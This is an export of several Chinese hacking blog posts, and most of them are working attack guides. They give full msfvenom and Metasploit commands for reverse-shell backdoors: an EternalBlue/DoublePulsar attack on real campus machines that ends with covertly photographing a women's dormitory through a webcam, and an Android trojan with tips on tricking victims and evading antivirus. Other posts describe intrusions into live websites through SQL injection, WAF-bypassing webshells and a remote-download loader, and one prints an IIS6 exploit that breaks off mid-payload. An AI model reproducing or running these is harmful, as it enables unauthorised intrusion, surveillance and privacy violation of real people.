[{"title":"Windows漏洞实战，盲打女寝","date":"2017-04-16T15:20:33.463Z","path":"2017/04/16/08/","text":"准备环境kalilinux 监听机，或者装有msf和nmap的linux即可，桥接物理机网络win03 攻击机 python2.6 + pywin32 环境 桥接 exp下载链接 https://github.com/misterch0c/shadowbroker12python-2.6.6.msihttps://www.python.org/download/releases/2.6.6/ 123pywin32-221.win32-py2.6.exehttps://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/ 靶机：不用本地的靶机，虽然测试成功了，但是要实战才有意思。所以扫本地的C段。 配置攻击机1【win2003】把下载的exp压缩包中Windows目录解压到攻击机上，不要解压到有中文目录的路径，不然会报错，解压完后，我们在Windows目录下新建一个空目录“listeningposts”，为什么要建立这个目录，因为fb.py中有个遍历目录的参数，对应的就是这个目录，默认是没有的。 利用nmap扫下C段，看有哪些机器开了445端口，主要针对win4 64 的主机进行试验。 1nmap -p 445 -O 10.20.70.0/24 扫描整个C段开放445端口的主机，并且探测系统版本。 针对目标主机 10.20.70.x 然后运行fb.py脚本，设置参数 攻击目标 [?] Default Target IP Address [] : 10.20.70.x 本机IP[?] Default Callback IP Address [] : 10.20.88.207 是否重定向[?] Use Redirection [yes] : no 是否输出日志[?] Base Log directory [D:\\logs] : no 根据提示，新建一个项目，然后默认设置，直到设置use eternalblue 设置好选择Yes,然后一路回车默认，直到出现选择针对的目标系统和加载的MODE 这里我都选择1，因为我针对的系统是X64的win7，MODE用本身自带的一个fuzz框架。然后一路YES回车，直到出现 输入 use doublepulsar 然后一样默认设置回车yes，直到出现要我们再次设置攻击目标的信息，选择SMB服务，x64系统，利用RunDLL模块。 到这里，配置这个exp已经差不多了，这时候打开kalilinux，利用msf配置一个DLL的后门，因为刚才我的fb.py利用的模块是RUNDLL。 配置攻击机2【kalilinux】利用msf生成一个x64位的dll后门 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.20.89.101 LPORT=5555 -f dll &gt; s.dll 然后msfconlse 打开msf 设置参数开启侦听12345678msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; set lhost 10.20.89.101lhost =&gt; 10.20.89.101msf exploit(handler) &gt; set lport 5555lport =&gt; 5555msf exploit(handler) &gt; exploit 设置完kalilinux，把刚才生成的dll后门，放到win03攻击机1的C盘目录下。 然后在攻击机1下设置开始攻击。 这时候，kalilinux下反弹了一个shell回来,成功了，HELP一下，看看这个shell有什么功能 功能挺多，运行一下截图桌面的命令。screenshot 原来在看爱奇艺 看到拍照功能，试验一下。webcam_snap竟然一不小心盲到了女寝的C段，学校的wif IP是随机分配的，好吧，我不是有意的，因为隐私问题固打码，看样子妹子也是一脸懵逼，估计摄像头的灯亮了下。:P 运行shell，获取一个system的权限，利用命令开3389，并且创建隐藏账户 功能还有很多，可以利用system权限远程下载一个远控等等，自己挖掘,这里就不继续演示了。排版可能有问题，凑合看吧！ 总结这个漏洞基本是通杀的，真的非常可怕，分析了下源码发现全是自带的库，无奈编程太菜，看了下网上的分析，发现这个漏洞也是基于堆栈的底层溢出，底层的东西我相信还有更多的漏洞没被挖掘出来，无法想象真正的黑客组织手里的0day有多可怕，也让我看到了差距有多大。 两个字总结：震撼！ 参考文章：http://www.jb51.net/hack/95788.html http://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=502990295&amp;idx=1&amp;sn=181c1e9b01854b87d3d4752c593c4dd4&amp;chksm=700a2442477dad54b542427edad3ec16df8cde9f470ee4e6f4597d4866d64b405801baf3d799&amp;mpshare=1&amp;scene=23&amp;srcid=0415ThTsF2Uj2kCRQZeTr8Bh#rd","tags":[{"name":"kali 0day","slug":"kali-0day","permalink":"http://fjhack.me/tags/kali-0day/"}]},{"title":"你好！新的世界","date":"2017-04-10T14:25:53.055Z","path":"2017/04/10/07/","text":"看完猪猪侠一段在先知白帽大会的演讲视频，深受感触，说实话，和他比起来真的是感觉自己是个什么都不懂的小白，完全是两个世界的人，我很多原理不懂，用的很多入侵思路方式都还是十几年的那一套。当然，很多人依然再用这一套万年不变的思路！就算是培训也是，如果跟不上时代的步伐，那么自己永远都没办法进阶到另一个阶段，或许一辈子都是个只会用工具脚本小子，有的人会说，工具玩的6也是很厉害的大神，确实，精通各种渗透工具配合使用，收集各种利用漏洞姿势确实很厉害，可是，如果你不改变，不去了解底层，不会研究poc，exp等等，终究会被淘汰，当然，这只是我自己的个人观点，就算结局没这么糟糕，我相信，一个写工具的人和一个只会使用工具人，世界观都是不同的，而且前者会一直走在后者的前面。 记得朋友跟我说过他的一个想法 他说以后的渗透都是全自动的智能渗透，这个载荷也许只是一个软件，或者是一台集成了很多功能的一台终端。利用大数据对接，可以一键收集信息，一键模拟攻击，甚至可以一键渗透提权等等，全部只需要人工智能帮你来完成，当时我听到他的想法觉得挺搞笑的，感觉有点痴人说梦，后来细想下并且找了一些深度学习的资料，发现他不是在开玩笑。人工智能已经发展了一段时间，最著名的就是那个“阿尔法狗”，我相信，不需要多久，也许就是几年的时间【或许已经有了】，自动化攻击就会非常成熟，metasploitabls不就是个例子么？傻瓜式的加载对应漏洞的exp，一键攻击。猪猪侠提倡的fuzz测试不就是个例子么？纯自动化的攻击，测试，无论是成本和时间都会降低非常多。 而且现在都是自动化运维，我相信很多人在渗透测试的时候都碰到过waf防护软件或者是防火墙，面对一个网站如果有CDN，应用层waf，云端waf的时候会发现很难下手，虽然可以绕过去，但是大大的加大了渗透的成本，因为据我所知，现在的waf虽然还是基于正则匹配，就算你绕过了一种规则，还有无数的规则约束着你。而且waf的种类也越来越多，物理层设备waf，应用waf，服务器waf，云端waf等等，前段时间我自己研究绕一些很过气的应用层waf注入，绕了几天，虽然绕过了匹配规则，可是发现绕过后不会写成sqlmap的tamper，得自己花费大把的时间进行手工注入。所以，不会写脚本是一件很让人伤脑筋的事情，当然，如果是一个会写脚本的大牛，那么，工作量可以缩短很多很多倍，而且，也更加的简单，甚至可以做到一键绕waf，根本不需要手动去绕过waf的匹配规则，只需要写个脚本，测试waf的规则对应写出脚本就行。 但是工具是人写出来的，太依赖工具反而不行，当一个新漏洞出来的时候，人们首先想到的是有没有出exp，或者是利用工具，反而那些形成原理poc不再被大多数人关注，我以前就是如此，为了一个exp会花几个小时去谷歌百度，到最后找到后狂刷一波，感觉自己已经完全了解这个漏洞了。可是事实并不是这样，你的确会利用了，如果漏洞稍微变了下呢？感觉自己就蒙了，连触发点，形成原理都不明白，然后又会去找exp，这是很可怕的。 说了这么多，其实只是想让更多人了解到，时代在进步，思想还是老套的是迟早会被淘汰的。我也从猪猪侠的演讲中找到了学习的方向和自己的不足，确实如此，web安全只是计算机体系中一个微不足道的东西，如果要让自己能够懂更多的东西，那么需要学习更多的东西，上到前后端，应用开发，各种框架开发下到系统底层结构，汇编，数据传输和二进制等等，不说精通，但是也要了解，等自己对网络世界【或者计算机世界】有一个全新的概念的时候，再回来看web安全，也许会有另一种感觉。 学习计划：1.首先必须学会一门或者多门语言，从python开始，毕竟大部分的poc和exp都是基于python的，至少不会发生大牛发出的exp不会使用和分析判断的事情，然后再尝试自己写类似的exp脚本。最后在自己做代码审计挖属于自己的漏洞！ 2.坚持关注时事漏洞的进展状态，今天爆出的漏洞，过几天才从别人口里知道，这是件很LOW的事情，关注其他方向的发展，比如人工智能等等！ 3.学习kalilinux，学习他人的新思路，更加要学会安全防御，只会攻击不会防御修复，都是白学！ 4.重新学习底层的知识：tcp/ip协议，底层二进制等等。 总结写的文章比较烂，没有文笔这是没办法的事情，但是尽量把自己的想法用语言表达出来，制定的计划不多，也比较杂，但是自己要完成确实是一件挑战，因为以前制定过类似的计划，可惜过了一段时间就GG了，这很丢人，所以，这次一定让自己沉下心安心搞学习，低调求发展，不要跟别人去谈什么理想，谈论别人多牛逼多牛逼，能日多少站，能黑掉什么。说实话，不如自己去做来的实际，不浮躁沉下心才是最好的。 至于为什么要写这个文章，虽然并没几个人看，但是至少给自己一个警钟—–跟不上时代的脚本，你就得被淘汰。 ：） 知识面，决定看到的攻击面有多大。 知识链，决定发动的杀伤链有多深。 —-猪猪侠 最后附上猪猪侠的视频链接，会学到很多很多东西！：http://www.huajiao.com/l/94991075 so Come on :)","tags":[{"name":"感言","slug":"感言","permalink":"http://fjhack.me/tags/感言/"}]},{"title":"Python之路---最简单的爬虫","date":"2017-04-08T16:46:33.997Z","path":"2017/04/09/06/","text":"前言在一位编程大牛朋友【确实很厉害】的监督和帮助下，终于写了自己的第一个非常非常简单的python爬虫,我对编程这块无论是php，python，汇编等等，懂得只是一点点皮毛，可以算是门都没入，看过很多教程，例如廖雪峰和小甲鱼的python教程，也学了一个学期的php，但是除了写个循环判断，和字谜小游戏之外发现自己啥都不会，所以，励志一定要学好编程，用猪猪侠的话来说，不会编程是一件非常丢脸的事情，的确如此，发现自己的不足，就要去完善，毕竟自己会写程序是件很有成就感的事情，那么先从爬虫开始吧！：） 正文先定一个小目标，比如，先利用python爬下百度的首页文件！ 先附上代码： 12345# -*-coding:utf-8 -*-import urllib2respone = urllib2.urlopen(\"http://wwww.baidu.com/index.html\")html = respone.read()print(html) 代码简单分析：urllib2是python自带的一个库，它的功能是获取urlopen函数的形式提供一个非常简单的接口，还支持http/ftp/Gopher协议 urlopen一般接收的三个参数，第一个是url，第二个是要传送的data数据，第三个则是超时设置1urlopen(url, data, timeout) 这里我们只要获取百度的首页，那么我们首先导入这个库，然后把 “urlopen”通过HTTP协议获取的值，赋给对象变量“respone”当我们利用urllib2库的时候，我们已经获取到了百度的首页文件内容，并且把获取到的内容赋值给了对象变量，可是如果我们直接打印这个变量查看内容是看不到百度首页文件的，直接打印输出变量的内容的话，会输出以下结果 1&lt;addinfourl at 139728495260376 whose fp = &lt;socket._fileobject object at 0x7f1513fb3ad0&gt;&gt; 很明显，此时urlopen的返回值ret_picUrl，其实是一个Object，而不是我们想要的首页内容，所以，我们需要加上一个read()函数，并且重新赋值输出。得到的内容是最直接的html代码 到这里，我成功地利用爬虫【虽然很简单粗糙】爬到了第一个页面，但是这个确实是成功了！但是，获取一个页面实在没啥意思，在大牛的指导下，进一步对这个简单的不能在简单的爬虫进行了小小的升级。 正则表达式正则表达式用百度的原话来说：又称规则表达式。（英语：Regular Expression，在代码中常简写为regex、regexp或RE），计算机科学的一个概念。正则表通常被用来检索、替换那些符合某个模式(规则)的文本。 对于一个这样的页面，如果我只想获取其中的一部分内容【比如标题，名称等等】，而不是整个爬下来，那么我们就需要在爬虫中添加正则表达式。 虽然听过很多次，而且也绕过一些正则匹配的waf，但是第一次写正则表达式还是写了很久很久，最后才勉强达到预期百分之五十的效果，毕竟写程序太菜了，我写的是爬百度贴吧某一篇帖子的第一页下所有用户名的名称，随便找了篇帖子，审查元素查看了下名称的位置，然后构造代码。 代码如下：123456789# -*- coding:utf-8 -*-import urllib2import re response = urllib2.urlopen(\"http://tieba.baidu.com/p/4886639100\")html = response.read()p = re.compile('&lt;a data-field=.*alog-group=\"p_author\" class=\"p_author_name j_user_card\" href=.*ie=utf-8.*fr.*=utf-8.*&lt;/a&gt;');result = p.findall(html)print(result) 代码简单分析爬虫大体和上面的爬虫差不多，但是导入了一个re的库，利用这个库我们可以添加变量对象为“p”的正则表达式，匹配具体内容就是匹配我们利用urlopen获取到的页面中其中带有 data-field=.*alog-group=”p_author” …..中的数据，然后利用findall()函数把规则应用到有页面信息的变量对象，全文匹配检索，最后输出检索出来的值。 小结第一次写正则真的好迷！试了很多匹配规则，也许是自己的语法问题，虽然爬到了信息，但是死活达不到自己想要的效果。所以只能利用最简单的“.*”规则进行匹配，而且爬到的中文名还以ASCLl编码显示，对变量编码也没有研究过，写这篇文章的时候已经是半夜两点了所以没有继续再深究了。但是自己不会放弃会慢慢完善自己的的第一个爬虫！ 最后得出一个结论：审计代码和写代码果然是两回事！ 附上爬出的数据截图 正则表达式语法表","tags":[{"name":"爬虫 Python","slug":"爬虫-Python","permalink":"http://fjhack.me/tags/爬虫-Python/"}]},{"title":"利用kali和pentestbox下的msf生成安卓木马","date":"2017-04-06T06:26:50.998Z","path":"2017/04/06/05/","text":"Metasploit“简称msf”，是一款开源的安全漏洞检测工具，集成了千百个攻击载荷和漏洞利用exp，安卓远控就是通过配置一个可回连的apk木马，设置好回连端口何IP，然后利用MSF里的一个TCP反弹shell的载荷进行对安卓手机的控制，具体操作如下。 12kalilinux :msfvenom -p android/meterpreter/reverse_tcp LHOST=10.20.72.178 LPORT=5555 R &gt; /root/1.apk pentestbox :1msfvenom -p android/meterpreter/reverse_tcp LHOST=10.20.72.178 LPORT=5555 R &gt; F:/1.apk 上面的命令大概就是利用msf生成一个可以回连侦听的APK安卓木马后门，LHOST填写你的本机IP，LPORT填写你要侦听的端口号，然后把文件重定向输出到你要的目录。 注：kali 2.0版本以后msf的生成pyload命令改成了msfvenom -p pentestbox: 在kalilinux下默认集成了msf，如果在Windows下使用msf，可以下载pentestbox，pentestbox是一款工具包，penbox下继承了大部分kali的工具，比如beef，burp，sqlmap等等，msf也集成了进去，所以总体来说还是很强大的。 当我们生成了APK木马后，然后我们配置msf，调用它的一个TCP反弹shell的载荷 命令如下：1234567msfconsole【打开msf】use exploit/multi/handerset payload android/meterpreter/reverse_tcp【选择payload】 show options 【查看参数情况】 注：pentestbox命令一样 从上面的图片我们可以看到，我们还没有设置要侦听的IP和端口信息，所以我们设置端口侦听。 12345set rhost 10.20.72.178 [这里设置的监听IP和刚刚生成的木马IP一样]set rport 5555 [设置刚刚生成木马的端口]exploit [开始监听] 当执行exploit的时候，msf已经处于监听端口的状态，只要你把你刚刚生成的安卓木马安装到对方手机上就会反弹一个msf的shell。 这是本机做测试生成的一个shell，我输入了sysinfo查看了被控端手机的设备信息，执行ifconfig查看了IP，当然，能做的事情不单单只有这么点点，比如还可以下载对方的通话记录，短信记录，开启对方的摄像头，拍照，录音功能，或者如果是root权限的话，直接增删改查任何文件也可是可以的。 通话记录截图： 命令：12345ifconfig 【查看端口】sysinfo 【查看系统信息】webcam list 【查看手机存在几个摄像头】webcam_snap -i 1或2【开启摄像头拍照】webcam_stream 【开启摄像头】 其他命令自己挖掘。可以利用help查看可用的命令。 小结网络问题：如果你本身的IP是内网IP，那么你最好开一个钓鱼wifl，或者把这个木马捆绑到一个正常的APK应用骗别人打开，当他人和你在同一网段才能进行端口监听，当然，你也可以进行内网转发，利用花生壳，等软件进行一个外网监听，这样只要你把APK木马移植到目标手机上，那么就可以进行监听操作，当然，前提是要对方开启网络。 免杀问题：现在的手机一般都是自带杀软，或者第三方杀软，msf生成的木马默认不是免杀的，所以在具体情况下要针对进行免杀。 ：） 内网转发的教程明天在写 pentestbox下载链接：下载 kalilinux下载链接：下载 后续pentestbox利用花生壳进行内网转发因为IPV4的地址有限，现在已经被分配的差不多了，所以大部分情况下，我们的PC电脑都是在内网当中，内网也就是私有的IP地址，也就是我们常说的局域网，例如： 192.168.1.0/24 10.10.20.0/24…上面这几个段都是一个内网C段，我们的PC大部分都是这样的，网吧也是如此。 私网是不能直接访问互联网的，必须做相关的路由策略或者进行一些配置才能接入到互联网，当然，首先你得有个宽带账号：） 所以，如果我们想配置安卓木马让外网的用户也能上线的话，我们就需要用到端口转发，也就是说，让别人可以直接访问到我们PC上的某个服务端口，进行建立连接，可以是httpweb网站服务，也可以和一个木马的控制端进行连接，这个其实非常简单！ 这里我们使用到的一个内网端口转发程序是“花生壳”。 花生壳的原理就是把你想转发的端口，通过服务，映射到某个外网的IP端口，学过网络的人可能知道，这个类似于NAT的多路复用转换原理。确实我感觉也是差不多。 首先我们注册一个花生壳的账户，并且在官网下载客户端，这些东西百度就好。 打开客户端，我们点击内网穿透，进行设置。我们申请一个免费域名，申请免费域名的目的，就是你内网要转发出去的那个服务器地址，这里花生壳利用一个域名当做外部地址。 这里我已经申请了两个免费域名，并且配置好了。 如果我们要添加一个内网穿透的地址，那么我们只要点击添加映射就行，如图： 上面的内容首先你添加一个名称，随便填即可。 然后填写你自己当前内网主机的IP地址，通过cmd下的ipconfig可以查看到 注：动态IP会每次重启后自动从dhcp服务器获取一个地址，所以不是固定的内网地址。 然后添加一个你要转发的端口号，因为当我们设置木马的时候，可以自己设置监听端口，所以，这里只要和木马的监听端口保持一致就好。 当我们设置好之后，我们就可以配置我们的木马了。 木马的配置上面讲的很明白，需要改动的地方，只要把反弹的地址IP换成你的域名地址，和你刚刚设置的端口号即可。 但是当我们msf设置本地监听的时候，我们需要设置监听的地址为我们本地的主机IP和端口，这些其实很简单。 以上做完以后，基本一个安卓木马的内外网上线已经很清楚了，如果不懂得话自己多琢磨就可以弄得很明白，或者在下面留言就好。 总结虽然这个实验目的技术要求不高，但是确实学到了很多东西，比如，内网转发，msf的基础使用，还有一些最基础的网络知识，当然，这些知识基础而已，更高级的的木马配置涉及到免杀绕过主动防御，自动上线反弹，等等，需要很底层的知识，遗憾的是我对这方面也不是很懂，需要自己不断地探索。 ：）","tags":[{"name":"kali 安卓木马","slug":"kali-安卓木马","permalink":"http://fjhack.me/tags/kali-安卓木马/"}]},{"title":"一次针对非法站点的渗透","date":"2017-04-05T07:30:28.970Z","path":"2017/04/05/04/","text":"算是朋友发过来的一个非法的基金操盘站，首先我们进行一些基本的信息判断收集。 ur：:http://www.xxxx.com/ 架构判断：php+阿帕奇+mysql+win/linux【大小写判断】 cms指纹：ecshop商城的二次开发 端口，旁站，C段等等 详细的信息就不列了，重点不在这里，这种站一般是要有前台的账号密码，当然，我也有。登录到前台大致看了下，简洁，url没有可利用传递的参数， 猜了几个比较常用的目录，没有发现什么，先上WVS扫一波吧，因为有会员账号， 所以登录状态扫描的话，会比不登录扫描爬到的页面更多，当然，前提是服务器没有防扫描，不然WVS的扫描动静碰到waf就死。这个站碰巧没有waf，当然，仅仅是没有waf，如果有waf的话只能利用其他的方法，比如说添加百度等这些友好的头部，waf对这些爬虫还是很友好的。 打开WVS，新建一个任务，然后在让你打开保存的cookie登录文件的地方新建一个工程文件，登录我们的账户，然后保存工程文件，退出，这里不说具体，详情可以去看WVS中文使用手册。看见红色高危，我就放心了，两个注入，一个XSS漏洞【估计是误报，XSS传递的参数都没有，事实证明是误报的】，测试漏洞，直接从SQL注入开始吧，看了一下WVS模拟的http包参数可以看到，这是一个基于HTTP头部Agent 的注入，这种注入很少碰到，百度看了下文章，跟cookie注入和host主机头注入是差不多的，也是对于提交参数不审核，带入数据库进行查询而产生的，当然手工有文章可是想快点验证，所以利用sqlmap直接注入。CODE： 123456789101112131415GET /home/index.php HTTP/1.1Referer: http://www.google.com/search?hl=en&amp;q=testingUser-Agent: if(now()=sysdate(),sleep(0),0)/*'XOR(if(now()=sysdate(),sleep(0),0))OR'\"XOR(if(now()=sysdate(),sleep(0),0))OR\"*/Client-IP: 127.0.0.1X-Forwarded-For: 127.0.0.1X-Forwarded-Host: localhostAccept-Language: enVia: 1.1 wa.www.test.comOrigin: http://www.test.com/X-Requested-With: XMLHttpRequestCookie: real_ipd=1.180.212.49; ECS_ID=eff3314f58e854862f4299b7cd5eba26b5cd1a30; ECS[username]=H74652211; _ga=GA1.2.1142116738.1481088459; _gat=1Host: www.xxxx.comConnection: Keep-aliveAccept-Encoding: gzip,deflateAccept: */* 利用姿势： 首先抓取一个提交的get包，在get包里面我们可以看到agent头部信息，然后我们在agent信息后后面加上一个*标记，表示着重优先扫描，保存数据包到我们的sqlmap目录下。 然后打开sqlmap输入语句： sqlmap.py -r 1.txt –level 3 //这个等级三一般是用来检测头部注入 回车跑，出来了，存在注入，那么应该稳了吧，谁知道事实没这么顺利，跑出注入以后的几种思路 1.root权限，如果是root那么可以进行sql语句，读文件，和【有绝对路径】直接利用sql写shell。 2.普通权限，跑管理员的账号密码然后找后台地址，登录再进行尝试拿shell 然而两种都行不通，具体说下吧，首先我们跑了下权限，确实root，按道理来说root离拿shell没多远了，首先尝试直接跑管理员的密码数据，跑表列这些就不说了，我们直接跑当前库。 发现管理员的数据被保存在user_admin表下，跑出列内数据，MD5解密，发现两个都解不开，【最后上了服务器才发现hash密文是加盐的，也就是常说的双重加密】，换了几个国内外的MD5解密都解不开，看样子是运气不好。 那就换个思路，root权限按道理是可以执行sql语句的，那么我们是不是可以利用sql语句把原来的密文替换掉，或者我们自己新加一条管理员的数据呢，本地测试，可行，成功添加了管理员并且可以登录，那么我们也构造提交看看。 本地测试结果： 语句： sqlmap.py -r 1.txt –level 3 –sql-shell//进入sqlshell 然后执行mysql语句 insert into admin_user (username，password) values (‘admin88’,’MD5密文’) 想在管理员的列内添加一个admin88用户，执行之后发现，报错，百度看了下，说是模式问题，那么换种执行SQL语句的模式 sqlmap.py -r 1.txt –level 3 –sql-query “insert into admin_user (username，password) values (‘admin88’,’MD5密文’) “ 发现还是执行不了，然后请教一些大牛，大牛们说，不能执行多条语句，那么我们尝试执行 show databases 和 show tables 发现还是不行【最后发现是360在做鬼】 两种思路不行，那么只有尝试最后一种思路，写shell，因为是mysql，我们需要找到网站的绝对路径，找了很久没有找到【读阿帕奇的默认配置文件，尝试猜解路径等等】最后是在wvs里面已经爆出了绝对路径，自己没有发现而已 【以后要细心】，得到绝对路径D:\\WWW\\xxx\\home\\尝试写shell。 sqlmap.py -r 1.txt –level 3 –os-shell 发现也写不进去，有大牛说是目录不允许写入，换了几个目录，包括upload目录，应该不是权限的问题，最后还是失败，这时候觉得有点问题了，执行不了SQL语句，写不了shell，破解不了管理员密码，那这个注入也没什么用了， 还是返回思路，看了下WVS，也没发现什么可以利用的。 最后抱着试试的心态读了一下数据库的用户密码和一些配置文件，因为是root权限，而且服务器开了3306端口，如果允许外连的话，应该会有突破点。 读出来了 root/root 用工具尝试外连Mysql默认关闭外连。 失败。。。 这时候快要放弃了，朋友发来一个页面，也就是前台的会员上传头像的地方，有上传点是否有上传漏洞呢，尝试上传，首先上传一张正常的图片，发现上传后，审查元素查看路径，发现可以访问，那么这个上传点是正常的没有坏。 那么尝试直接上传脚本。这时候无语了，发现也上传上去了，审查元素，查看路径，进行访问，404！竟然访问不到？ 再次上传图片，发现可以访问，这时候进行判断，是否有waf之类的东西，上传一个txt，发现也访问不到，那么应该不是waf，最后测试发现，除了上传图片，其他的上传文件几乎都访问不到，这就有点迷惑了，为什么有上传路径但 是却访问不到呢，抓包看看，抓包看了没发现什么区别，上传图片和其他格式的文件服务器返回的响应都是302，那么按道理是存在任意上传，而且文件应该上传上去了，测试了几种突破上传，无果，那么为什么访问不到呢，这时候 反复试了几次，大概判断是waf之类的在做鬼，把上传的图片文件内容替换成了一个免杀一句话，然后不通过审查元素查看路径看看，利用抓包路径访问，发现，成功上传shell，但是直接访问url是报错的，那么用菜刀尝试连接一下，成功getshell，拿到一句话权 限之后，发现开始上传的图片，txt都在目录下，唯独php那些脚本不见了，难道是被杀了，只有上服务器一探究竟了。 一句话的权限还是很大的，sys权限，跨磁盘也有增删改查权限，看了一下IP，是外网可以直接3389连接。直接提权，连接，连接之后发现原来是360主动防御在做鬼，难怪执行不了SQL语句和写入文件，却可以进行扫描【后面尝试 写入文件发现360自动阻拦】，然后打开数据库，尝试增加一条数据，发现增加后的数据后台登录不了，最后发现原来cms利用了加盐的加密，难怪死活解不开，那么我们把加密值改为0，添加一条未加盐的MD5密文，数据库会默认改为加盐值，当然，如果你想解开管理员原有的密码，只能够解开他的加密算法，在进行MD5接密，最后成功添加，进入后台之。 渗透到此结束，写了一些思路也不全是我一个人的思路，有朋友帮忙，有些东西也没写出来，因为敏感，图片贴的比较少，因为怕人爆菊【查水表就不好了】，写这个笔记的原因也是为了以后没思路的时候看看，这次的渗透主要是想说明，两个问题。 第一：思路要明确，要细心，不要放过任何一个可以利用的地方，渗透如果说你没有0day或者其他的技巧的话，你就需要比别人多一份细心。 第二：不要习惯自己的方法，比如说审查元素查看上传后的地址，要习惯与抓包查看，要细心分析每一个地方。 PS：因为敏感网站，固打码，图片较少因为HEXO的图片引用太麻烦，如果一定需要图片的话，会加上去，没有什么奇淫技巧，只是一点小小的经验 :)","tags":[{"name":"-渗透笔记","slug":"渗透笔记","permalink":"http://fjhack.me/tags/渗透笔记/"}]},{"title":"利用MySQLROOT权限远程下载脚本绕过云锁拿shell","date":"2017-04-04T13:20:00.950Z","path":"2017/04/04/03/","text":"碰到个阿里云盾+安全狗+云锁+thinkphp的站，其实也没什么思路，前台上传有JS的验证，后端还有白名单，只是运气好，扫出个备份文件，得到其数据库账户，连接之。 连接上，通过查看MySQL数据库下的user表，发现是root用户的权限和当前用户是一样的，那么就是root 了。思路，找到后台账户密码，登录之，发现也没什么利用的，上传点和前台一样白名单。 换思路，利用MySQL写文件函数，写shell进网站的目录，首先需要知道网站的绝对路径，利用thinkPHP的报错特性，爆出绝对路径。直接执行SQL语句 select ‘一句话’ into outfile ‘D://thinkhphp//xx//1.php’ 注意：云锁如果不检测写入的内容的话可以直接写明文， 但是最好写hex加密代码，那么代码就不需要单引号括起来，还要注意的就是，写绝对路径必须写两个“/”,除非写\\，否则会被转义。 本机测试，成功写入一句话，但是连接的时候被云锁拦截了，个人感觉可能是云锁拦截了post的特征，需要修改菜刀的连接特征，可惜我不会。.直接写入大马测试，nosafe的大马可以正常使用，直接写入大马，发现大马字符太大没办法写入，这时候利用95zz发的一个脚本，执行远程下载，他在文章中说因为云锁是拦截php代码的，例如&lt;? ?&gt;，的头部，所以远程下载的脚本是利用JavaScript转写php 1&lt;script language=\"php\"&gt; $a='http://远程地址/sss.txt';$b='file'.'_g'.'et_'.'contents';$b = $b($a);file_put_contents('file.php',$b); &lt;/script&gt; 这行代码是利用一个远程下载函数，将远程服务器的文件下载，并重新生成一个file.php的php代码，所以我们在自己的web服务器上放上大马的txt，配合利用MySQL的文件写入先生成一个远程下载的php，在直接访问这个php，生成一个php大马，测试通过，成功getshell，尝试提权，无法使用大部分cmd提权命令，目的只需要shell权限就好，没有深究，做了一个文件包含，固权，退之。 包含脚本：12345if(isset($_GET[\"id\"]))&#123;require_once('D:\\\\WWW\\\\web\\\\images\\\\load.jpg');&#125;注意闭合。","tags":[{"name":"绕过Waf","slug":"绕过Waf","permalink":"http://fjhack.me/tags/绕过Waf/"},{"name":"渗透笔记","slug":"渗透笔记","permalink":"http://fjhack.me/tags/渗透笔记/"}]},{"title":"IIS6.0远程代码执行漏洞个人浅析","date":"2017-04-03T08:22:32.720Z","path":"2017/04/03/02/","text":"PS：不喜可以喷，要是要喷的有理由，这样你指出了我的错误，我也得到了学习何乐而不为？ IIS6.0远程代码执行的漏洞是发生在WebDav开启情况下发生的，当IIS6.0开启这个服务可以存在缓存区域溢出。 官方给出的exp： 1234567891011121314151617import socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(('192.168.5.128',88)) pay='PROPFIND / HTTP/1.1\\r\\nHost: 192.168.5.128:88\\r\\nContent-Length: 0\\r\\n'pay+='If: &lt;http://192.168.5.128:88/aaaaaaa'pay+='\\xe6\\xbd\\xa8\\xe7\\xa1\\xa3\\xe7\\x9d\\xa1\\xe7\\x84\\xb3\\xe6\\xa4\\xb6\\xe4\\x9d\\xb2\\xe7\\xa8\\xb9\\xe4\\xad\\xb7\\xe4\\xbd\\xb0\\xe7\\x95\\x93\\xe7\\xa9\\x8f\\xe4\\xa1\\xa8\\xe5\\x99\\xa3\\xe6\\xb5\\x94\\xe6\\xa1\\x85\\xe3\\xa5\\x93\\xe5\\x81\\xac\\xe5\\x95\\xa7\\xe6\\x9d\\xa3\\xe3\\x8d\\xa4\\xe4\\x98\\xb0\\xe7\\xa1\\x85\\xe6\\xa5\\x92\\xe5\\x90\\xb1\\xe4\\xb1\\x98\\xe6\\xa9\\x91\\xe7\\x89\\x81\\xe4\\x88\\xb1\\xe7\\x80\\xb5\\xe5\\xa1\\x90\\xe3\\x99\\xa4\\xe6\\xb1\\x87\\xe3\\x94\\xb9\\xe5\\x91\\xaa\\xe5\\x80\\xb4\\xe5\\x91\\x83\\xe7\\x9d\\x92\\xe5\\x81\\xa1\\xe3\\x88\\xb2\\xe6\\xb5\\x8b\\xe6\\xb0\\xb4\\xe3\\x89\\x87\\xe6\\x89\\x81\\xe3\\x9d\\x8d\\xe5\\x85\\xa1\\xe5\\xa1\\xa2\\xe4\\x9d\\xb3\\xe5\\x89\\x90\\xe3\\x99\\xb0\\xe7\\x95\\x84\\xe6\\xa1\\xaa\\xe3\\x8d\\xb4\\xe4\\xb9\\x8a\\xe7\\xa1\\xab\\xe4\\xa5\\xb6\\xe4\\xb9\\xb3\\xe4\\xb1\\xaa\\xe5\\x9d\\xba\\xe6\\xbd\\xb1\\xe5\\xa1\\x8a\\xe3\\x88\\xb0\\xe3\\x9d\\xae\\xe4\\xad\\x89\\xe5\\x89\\x8d\\xe4\\xa1\\xa3\\xe6\\xbd\\x8c\\xe7\\x95\\x96\\xe7\\x95\\xb5\\xe6\\x99\\xaf\\xe7\\x99\\xa8\\xe4\\x91\\x8d\\xe5\\x81\\xb0\\xe7\\xa8\\xb6\\xe6\\x89\\x8b\\xe6\\x95\\x97\\xe7\\x95\\x90\\xe6\\xa9\\xb2\\xe7\\xa9\\xab\\xe7\\x9d\\xa2\\xe7\\x99\\x98\\xe6\\x89\\x88\\xe6\\x94\\xb1\\xe3\\x81\\x94\\xe6\\xb1\\xb9\\xe5\\x81\\x8a\\xe5\\x91\\xa2\\xe5\\x80\\xb3\\xe3\\x95\\xb7\\xe6\\xa9\\xb7\\xe4\\x85\\x84\\xe3\\x8c\\xb4\\xe6\\x91\\xb6\\xe4\\xb5\\x86\\xe5\\x99\\x94\\xe4\\x9d\\xac\\xe6\\x95\\x83\\xe7\\x98\\xb2\\xe7\\x89\\xb8\\xe5\\x9d\\xa9\\xe4\\x8c\\xb8\\xe6\\x8